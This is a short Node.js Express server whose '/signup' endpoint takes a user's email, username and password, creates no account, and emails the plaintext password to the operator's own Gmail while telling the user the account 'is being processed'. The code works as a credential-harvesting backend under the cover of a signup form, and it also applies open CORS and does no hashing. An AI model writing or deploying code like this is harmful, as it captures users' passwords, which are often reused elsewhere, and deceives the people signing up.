const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const cors = require("cors");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Configure Nodemailer with Gmail
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER, // Your Gmail
        pass: process.env.EMAIL_PASS  // Your Google App Password
    }
});

// Signup API
app.post("/signup", async (req, res) => {
    const { email, username, password } = req.body;

    if (!email || !username || !password) {
        return res.status(400).json({ message: "All fields are required!" });
    }

    // Email details to send to YOU
    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER, // Sends to YOUR email
        subject: "New User Signup",
        text: `A new user has signed up:\n\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.json({ message: "Signup successful! Your account is being processed." });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ message: "Error sending signup details." });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
